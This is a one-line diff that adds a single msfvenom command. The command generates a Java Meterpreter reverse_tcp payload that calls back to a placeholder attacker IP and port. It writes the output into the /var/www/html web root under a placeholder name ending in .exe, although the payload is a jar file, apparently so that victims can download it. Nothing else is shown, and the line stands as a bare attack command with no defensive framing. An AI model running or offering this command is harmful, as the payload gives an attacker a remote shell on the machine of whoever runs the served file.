@@ -1,0 +1,1 @@
+msfvenom -p java/meterpreter/reverse_tcp LHOST=<attacker-IP> LPORT=<attacker port> -f jar --platform java -o /var/www/html/<filename.exe>
